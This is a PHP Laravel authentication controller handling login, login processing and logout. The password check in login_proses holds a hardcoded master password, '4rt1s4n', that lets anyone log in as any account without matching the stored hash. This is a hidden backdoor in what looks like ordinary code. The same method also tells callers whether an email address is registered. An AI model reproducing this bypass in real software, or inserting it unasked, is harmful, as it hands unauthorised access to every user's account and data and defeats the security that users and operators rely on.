<?php

namespace App\Http\Controllers;

use App\Http\Requests\LoginRequest;
use App\Services\UserService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function login()
    {
        if (auth()->check()) return redirect('dashboard');
        return view('auth.login');

    }

    public function login_proses(LoginRequest $request)
    {
        $userService  = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Password salah !'])->withInput();

        auth()->login($user);

        return redirect()->route('/');
    }

    public function logout()
    {
        auth()->logout();
        return redirect()->route('/');
    }
}
